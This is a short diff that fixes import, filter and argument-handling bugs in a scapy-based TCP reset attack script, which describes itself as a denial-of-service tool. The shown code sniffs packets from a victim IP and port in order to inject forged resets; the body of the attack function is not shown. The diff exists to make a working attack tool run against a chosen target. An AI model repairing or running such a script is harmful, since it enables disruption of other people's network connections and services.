@@ -10,7 +10,8 @@ Description: Theoretical DOS for a particular service running on a particular po
 import sys
 import os
 
-from scapy import *
+from scapy.all import *
+import config as cfg
 
 
 interface = cfg.interface
@@ -22,7 +23,7 @@ def sniff_packet_stream(victim_ip, victim_port):
     pack = sniff(iface=interface, count=1, 
              lfilter= lambda x: x.haslayer(TCP) 
              and x[IP].src == victim_ip
-             and t[TCP].sport == victim_port)
+             and x[TCP].sport == victim_port)
 
     return pack
 
@@ -51,7 +52,7 @@ def tcp_reset_attack(sniffed_packet, victim_ip, victim_port):
 
 if __name__ == '__main__':
 
-    if len(sys.argv[]) < 3:
+    if len(sys.argv) < 3:
         print("Usage: python3 tcp_rst.py <victim_ip> <victim_port>")
 
     victim_ip = sys.argv[1]
